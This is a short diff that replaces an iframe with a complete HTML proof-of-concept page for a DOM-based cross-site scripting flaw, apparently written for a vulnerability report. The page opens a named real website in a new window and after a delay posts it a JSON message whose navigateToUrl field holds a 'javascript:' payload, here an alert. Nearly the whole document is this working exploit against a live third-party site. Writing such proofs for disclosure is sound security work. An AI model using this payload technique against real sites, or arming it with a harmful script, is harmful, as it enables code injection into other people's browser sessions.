@@ -1,2 +1,22 @@
-<iframe id="victim" src="https://success.thousandeyes.com/" ...>
+<!DOCTYPE html>
+<html>
+<head><title>PoC - postMessage</title></head>
+<body>
+  <h3>PoC - DOM XSS via postMessage</h3>
+  <button onclick="sendPayload()">Abrir y Enviar Payload</button>
+
+  <script>
+    function sendPayload() {
+      const win = window.open("https://success.thousandeyes.com/");
+      const payload = {
+        navigateToUrl: "javascript:alert(document.domain)"
+      };
+
+      setTimeout(() => {
+        win.postMessage(JSON.stringify(payload), "*");
+      }, 3000);
+    }
+  </script>
+</body>
+</html>
 
